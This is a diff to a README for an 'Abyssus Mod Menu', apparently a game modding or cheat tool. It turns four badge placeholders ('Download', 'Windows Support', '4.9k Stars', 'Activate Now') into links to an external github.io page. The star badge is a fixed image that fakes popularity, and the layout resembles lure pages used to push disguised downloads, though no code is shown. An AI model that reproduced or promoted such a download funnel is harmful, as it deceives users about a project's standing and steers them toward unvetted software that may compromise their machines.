@@ -2,10 +2,10 @@
 
 The haunting world of *Abyssus* thrives on atmosphere and danger—but sometimes, you want more control. The **Abyssus Mod Menu** offers advanced customization features, letting you edit dungeons, adjust enemy spawns, and apply immersive visual tweaks. Perfect for creative sandboxing, challenge runs, or testing game mechanics.
 
-[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=download)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 4.9k Stars](https://img.shields.io/badge/GitHub-⭐️%204.9k%20Stars-black?style=for-the-badge\&logo=github)](#)
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
+[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=download)](https://abyssus-mods-menu.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://abyssus-mods-menu.github.io/.github/)
+[![⭐️ 4.9k Stars](https://img.shields.io/badge/GitHub-⭐️%204.9k%20Stars-black?style=for-the-badge\&logo=github)](https://abyssus-mods-menu.github.io/.github/)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://abyssus-mods-menu.github.io/.github/)
 
 ---
 
